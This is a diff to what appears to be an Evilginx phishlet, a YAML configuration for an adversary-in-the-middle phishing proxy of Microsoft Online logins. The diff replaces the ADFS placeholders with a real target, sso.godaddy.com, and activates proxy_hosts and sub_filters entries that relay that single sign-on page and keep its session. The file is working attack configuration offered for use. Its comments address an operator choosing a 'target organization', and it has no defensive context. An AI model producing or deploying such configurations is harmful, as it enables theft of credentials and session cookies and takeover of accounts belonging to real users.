@@ -8,16 +8,18 @@ proxy_hosts:
   # If they do, you need to uncomment all following lines that contain <...>
   # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
   # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
-  #    <insert-adfs-subdomain> = adfs
-  #    <insert-adfs-host> = example.com
-  #    <insert-adfs-subdomain-and-host> = adfs.example.com
-  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
-  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdoluremain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
+#      <insert-adfs-subdomain> = sso
+#      <insert-adfs-host> = godaddy.com
+#      <insert-adfs-subdomain-and-host> = sso.godaddy.com
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com:443', session: true, is_landing:false}
+#  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false}
+#    - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com:443', session: true, is_landing:false}
 sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], with_params: ['email']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true, with_params: ['email']}
   # Uncomment and fill in if your target organization utilizes ADFS
-  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 
 
 
